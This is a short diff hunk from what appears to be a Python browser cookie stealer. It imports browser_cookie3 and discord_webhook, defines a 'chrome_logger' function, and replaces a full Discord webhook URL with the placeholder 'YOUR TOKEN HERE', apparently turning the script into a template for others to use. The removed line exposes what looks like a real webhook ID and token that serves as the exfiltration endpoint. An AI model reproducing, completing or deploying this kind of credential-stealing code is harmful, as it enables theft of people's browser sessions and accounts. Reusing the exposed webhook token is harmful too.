@@ -1,6 +1,6 @@
 import browser_cookie3, requests, threading, discord_webhook
 
-webhook = 'https://discord.com/api/webhooks/998827910242775050/z8epKdhYmpsNOoAzTuQRT_uJk86K1x0XLxxX1oii9M8DmUUQU3Ftg-_vkFW3tTc9phKF'
+webhook = 'YOUR TOKEN HERE'
 
 def chrome_logger():
     try:
